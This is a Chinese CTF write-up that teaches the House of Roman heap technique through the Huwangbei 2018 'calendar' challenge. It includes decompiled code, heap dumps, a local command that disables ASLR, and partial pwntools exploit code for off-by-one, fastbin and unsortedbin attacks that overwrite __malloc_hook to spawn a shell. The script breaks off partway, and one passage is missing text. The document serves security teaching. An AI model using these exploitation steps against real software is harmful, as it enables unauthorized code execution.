# House-Of-Roman学习笔记
最近整理护网杯的题目（今年护网杯凉了），发现去年还留下一题pwn没有完成，题目提示是house of
roman，最近一次比赛也出现了一道叫fkroman的题目，估计也是涉及这个知识点，趁此机会学习一下house of roman，把去年留下的坑填上。
## 原理简述
House of
Roman这个攻击方法由romanking98在2018年4月提出（作者GitHub： ），主要用于程序无打印功能，在不泄露libc地址的前提下，通过低位地址写+爆破的方法来bypass ALSR。
忽略堆风水具体操作细节，简单总结House of Roman攻击原理就是：
  * 通过低位地址写修改fastbin的fd，修改到`malloc_hook-0x23`
  * 通过unsortedbin attack，将`main_arean`地址写入`malloc_hook`
  * 使用fastbin attack，通过低位地址写修改`malloc_hook`中的地址为`one gadget`
至于具体如何进行`fastbin attack`和`unsortedbin attack`，要根据题目进行具体分析，下面通过例题进行详细分析。
## 实战例题
进行本地调试时，可以先把ASLR关掉
    echo 0 > /proc/sys/kernel/randomize_va_space
完成exp后爆破使用脚本：
    #!/bin/bash
    for i in `seq 1 9999`; do python exp.py; done;
### 护网杯2018 calendar
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      signed int v3; // eax
      char s; // [rsp+10h] [rbp-50h]
      char v5; // [rsp+4Fh] [rbp-11h]
      unsigned __int64 v6; // [rsp+58h] [rbp-8h]
      v6 = __readfsqword(0x28u);
      init_0();
      printf("input calendar name> ", a2);
      memset(&s, 0, 0x40uLL);
      get_str((__int64)&s, 64);
      v5 = 0;
      printf("welcome to use %s\n", &s);
      while ( 1 )
      {
        while ( 1 )
        {
          v3 = menu();
          if ( v3 != 2 )
            break;
          edit();
        }
        if ( v3 > 2 )
        {
          if ( v3 == 3 )
          {
            remove();
          }
          else if ( v3 == 4 )
          {
            exit(0);
          }
        }
        else if ( v3 == 1 )
        {
          add();
        }
      }
    }
程序菜单：
    ---------calendar management---------    1. add a schedule
    2. edit a schedule
    3. remove a schedule
    4. exit
程序只有add，edit，remove
三个功能，跟常见的题目相比，明显少了一个show的功能，因此正常情况下缺少泄露地址的手段（当然有其他手段，暂且不提）。
漏洞点一：程序的读取输入函数存在off by one。
    __int64 __fastcall sub_B5F(__int64 a1, signed int a2)
    {
      char buf; // [rsp+13h] [rbp-Dh]
      unsigned int i; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v5; // [rsp+18h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      for ( i = 0; (signed int)i  x/32gx 0x556cfeda2000
    0x556cfeda2000: 0x0000000000000000      0x0000000000000021
    0x556cfeda2010: 0x0000000000000000      0x0000000000000000
    0x556cfeda2020: 0x0000000000000000      0x0000000000000071
    0x556cfeda2030: 0x0000000000000000      0x0000000000000000
    0x556cfeda2040: 0x0000000000000000      0x0000000000000000
修改后，可以看到1号chunk的size变成了0xe1
    pwndbg> x/32gx 0x556cfeda2000
    0x556cfeda2000: 0x0000000000000000      0x0000000000000021
    0x556cfeda2010: 0x6161616161616161      0x6161616161616161
    0x556cfeda2020: 0x6161616161616161      0x00000000000000e1
    0x556cfeda2030: 0x0000000000000000      0x0000000000000000
    0x556cfeda2040: 0x0000000000000000      0x0000000000000000
此时free掉1号chunk，会把2号chunk吞掉，组成一个0xe0大小的unsortedbin，这是本题得到libc地址的基础。
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x556cfeda2020 —▸ 0x7fe8036d6b78 (main_arena+88) —▸ 0x556cfeda2020 ◂— 0x7fe8036d6b78
    smallbins
    empty
    largebins
    empty
**攻击第一步**
：通过低位地址写修改fastbin的fd到`malloc_hook-0x23`，为什么是这里？因为这里有一个0x7f，用于后续的fastbin
attack。
    pwndbg> x/8gx 0x7fe8036d6b10-0x23
    0x7fe8036d6aed :   0xe8036d5260000000      0x000000000000007f
    0x7fe8036d6afd: 0xe803397e20000000      0xe803397a0000007f
    0x7fe8036d6b0d :      0x000000000000007f      0x0000000000000000
    0x7fe8036d6b1d: 0x0100000000000000      0x0000000000000000
现在的任务是让fastbins链中写入一个libc的地址，我们可以在上面的代码做个小修改，在进行off by
one之前，先把1号chunk释放掉，让它进入fastbins，再进行overlapping。
    add(0,0x18) # 0
    add(1,0x68) # 1
    add(2,0x68) # 2
    add(3,0x68) # 3
    remove(1)
    edit(0,0x18,'a'*0x18+'\xe1')
    remove(1)
这样可以让fastbin和unsortedbin重叠
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x55db47562020 —▸ 0x7f6faea28b78 (main_arena+88) —▸ 0x55db47562020 ◂— 0x7f6faea28b78
    0x80: 0x0
    unsortedbin
    all: 0x55db47562020 —▸ 0x7f6faea28b78 (main_arena+88) —▸ 0x55db47562020 ◂— 0x7f6faea28b78
    smallbins
    empty
    largebins
    empty
然后申请一个非0x70大小的chunk（因为申请0x70大小会优先使用fastbin），此时会使用`unsortedbin`进行分配，对此chunk进行edit就可以对fd进行低位地址写。
    add(3,0x18) # 3
    edit(3,0x1,p64(libc.sym['__malloc_hook']-0x23)[:2]) # p16(2aed)
    edit(0,0x18,'a'*0x18+'\x71') # fix chunk size
    add(1,0x68)
    add(0,0x68) # __malloc_hook-0x13
完成后可以看到fastbin的fd指向`_IO_wide_data_0+301`，也就是`__malloc_hook-0x23`
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x55db47562020 —▸ 0x7f6faea28aed (_IO_wide_data_0+301) ◂— 0x6fae6e9e20000000
    0x80: 0x0
    unsortedbin
    all: 0x55db47562040 —▸ 0x7f6faea28b78 (main_arena+88) —▸ 0x55db47562040 ◂— 0x7f6faea28b78
    smallbins
    empty
    largebins
    empty
再次使用`off by
one`重新修改0x55db47562020的size位为0x71，恢复fastbin的正常结构。进行两次分配后，可以申请到`__malloc_hook-0x13`的位置，查看程序存储chunk地址的list可以看到0号chunk指向了`__malloc_hook-0x13`。
    pwndbg> x/8gx 0x55db46403000+0x202060
    0x55db46605060: 0x00007f6faea28afd      0x000055db47562030
    0x55db46605070: 0x000055db475620a0      0x000055db47562030
    0x55db46605080: 0x0000000000000068      0x0000000000000068
    0x55db46605090: 0x0000000000000068      0x0000000000000018
**攻击第二步** ：通过unsortedbin attack，将`main_arean`地址写入`malloc_hook`。
由于本题限制了最大只能申请0x70大小的内存，因此在进行unsortedbin
attack前，首先需要修复fastbin，不然后续会发生报错。修复方法很简单，free掉一个0x70大小的chunk，然后使用UAF将fd修改为0，然后申请一个0x70大小的chunk，清空fastbin。
    remove(1)
    edit(1,7,p64(0)) # fix fastbins
    add(3,0x68)
首先申请一个0x50大小的，使unsortedbin与2号chunk重叠，然后直接对2号chunk进行edit，就可以进行低地址写，修改unsortedbin的bk为`__malloc_hook-0x10`。然后申请一个0x70大小的chunk，触发unsortedbin
attack，可以看到`__malloc_hook`的值已被修改为`main_arena+88`
    add(3,0x48)
    edit(2,0x8+1,p64(0)+p64(libc.sym['__malloc_hook']-0x10)[:2])
    add(3,0x68)
    pwndbg> p __malloc_hook
    $2 = (void *(*)(size_t, const void *)) 0x7f6faea28b78 
**最后一步** ：使用fastbin attack，通过低位地址写修改`malloc_hook`中的地址为`one gadget`。
至此，一切攻击都准备就绪了。第一步完成时，3号chunk已经指向了`__malloc_hook-0x13`，这里直接对3号chunk进行edit，修改`__malloc_hook`的低3位地址为`one
gadget`。然后使用double free触发调用`__malloc_hook`即可getshell。
    one_gadget = libc.address + 0xf02a4
    edit(0,0x13+2,'a'*0x13+p64(one_gadget)[:3])
    remove(3)
    remove(3)
    pwndbg> p __malloc_hook
    $3 = (void *(*)(size_t, const void *)) 0x7f6fae7542a4 
完整exp：
    from pwn import *
    target = 'calendar'  
    elf = ELF('./'+target)
    context.binary = './'+target
    p = process('./'+target)
    libc = elf.libc
    def add(idx,size):
        p.sendlineafter('choice> ','1')
        p.sendlineafter('choice> ',str(idx+1))
        p.sendlineafter('size> ',str(size))
    def edit(idx,size,content):
        p.sendlineafter('choice> ','2')
        p.sendlineafter('choice> ',str(idx+1))
        p.sendlineafter('size> ',str(size))
        p.sendafter('info> ',content)
    def remove(idx):
        p.sendlineafter('choice> ','3')
        p.sendlineafter('choice> ',str(idx+1)) 
    libc.address = 0x233000
    p.sendlineafter('name> ','kira')
    add(0,0x18) # 0
    add(1,0x68) # 1
    add(2,0x68) # 2